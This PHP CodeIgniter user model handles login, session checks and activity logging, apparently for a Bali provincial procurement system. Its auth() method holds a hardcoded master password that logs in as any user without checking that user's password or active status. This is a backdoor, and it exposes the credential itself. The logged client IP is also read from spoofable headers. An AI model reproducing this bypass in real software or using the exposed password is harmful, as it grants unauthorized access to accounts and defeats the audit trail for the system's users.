<?php

class User_m extends CI_Model{


	public function auth($username, $password){

		if ($password == '19Pengadaan_bali_prov'){

			$user_db = $this->db->from('user')->where('Username', $username)->get()->row();
		}
		else{

			$user_db = $this->db->from('user')->where('Username', $username)
					->where('Password', enc($password))
					->where('IsActive','1')
					->get()->row();
		}


		if (sizeof($user_db) == 0){
			return false;
		}


	//	if ($user_db->IsActive = 0){
	//		return false;
	//	}

		$user_a = array();
		foreach ($user_db as $key => $value) {
			$user_a[$key] = $value;
		}
		$user_a['ip'] = $_SERVER['HTTP_CLIENT_IP']?:($_SERVER['HTTP_X_FORWARDE‌​D_FOR']?:$_SERVER['REMOTE_ADDR']);
		$name = $this->session->set_userdata('userLogin', $user_a);

		$this->db->where('Id_User', $user_a['Id_User']);
		$this->db->update('user', array('Last_Login' => date('Y-m-d h:i:s')));

		return true;

	}



	public function getDetailLoginUser(){
		$user = $this->session->userdata('userLogin');

		return $this->db->from('user')->where('Id_User', $user['Id_User'])->join('jabatan_sistem', 'jabatan_sistem.Slug_Jabatan = user.Slug_Jabatan')->get()->row_array();
	}


	/**
	 * Untuk mengecek login user berdasarkan slug_jabatan
	 * @param  [type] $Slug_Jabatan [description]
	 * @return [type]               [description]
	 */
	public function checkLogin($Slug_Jabatan = null){

		$user = $this->session->userdata('userLogin');

		if (empty($user)){
			return redirect('home');
		}
		else{

			if ($Slug_Jabatan != null && $user['Slug_Jabatan'] != $Slug_Jabatan ){
				return redirect('home');
			}
		}

	}


	public function createLog($kegiatan){
		$a['Ip_Address'] = $this->session->userdata('userLogin')['ip'];
		$a['Kegiatan'] = $kegiatan;
		$a['Id_User'] = $this->session->userdata('userLogin')['Id_User'];

		return $this->db->insert('log_activity', $a);
	}

	public function getActiveByJabatan($slug){
		$user = $this->db->from('user')->where('Slug_Jabatan', $slug)->where('IsActive', 1)->get()->row_array();
		return $user;
	}
}
